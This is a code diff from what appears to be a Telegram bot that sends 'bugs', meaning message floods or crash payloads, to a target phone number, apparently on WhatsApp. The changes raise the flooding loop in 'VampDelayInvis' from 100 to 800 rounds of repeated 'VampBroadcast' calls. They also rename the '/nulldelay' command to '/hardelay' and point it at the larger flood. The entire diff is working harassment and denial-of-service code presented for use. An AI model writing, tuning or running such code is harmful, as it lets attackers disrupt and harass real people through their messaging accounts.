@@ -1212,13 +1212,7 @@ async function VampOri(target) {
 
 }
 async function VampDelayInvis(target) {
-    for (let i = 0; i <= 100; i++) {
-    await VampBroadcast(target, mention = true)
-    await VampBroadcast(target, mention = true)
-    await VampBroadcast(target, mention = true)
-    await VampBroadcast(target, mention = true)
-    await VampBroadcast(target, mention = true)
-    await VampBroadcast(target, mention = true)
+    for (let i = 0; i <= 800; i++) {
     await VampBroadcast(target, mention = true)
     await VampBroadcast(target, mention = true)
     await VampBroadcast(target, mention = true)
@@ -1605,7 +1599,7 @@ bot.onText(/\/superdelay(?:\s(.+))?/, async (msg, match) => {
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
     });
 });
-bot.onText(/\/nulldelay(?:\s(.+))?/, async (msg, match) => {
+bot.onText(/\/hardelay(?:\s(.+))?/, async (msg, match) => {
     const senderId = msg.from.id;
     const chatId = msg.chat.id;
 
@@ -1636,8 +1630,8 @@ bot.onText(/\/nulldelay(?:\s(.+))?/, async (msg, match) => {
     });
 
     // Proses pengiriman bug
-    for (let i = 0; i < 20; i++) { // Kirim 3 kali langsung
-        await nullQ(formatedNumber);
+    for (let i = 0; i < 1; i++) { // Kirim 3 kali langsung
+        await VampDelayInvis(formatedNumber);
     }
 
     // Kirim notifikasi setelah selesai dengan gambar lain
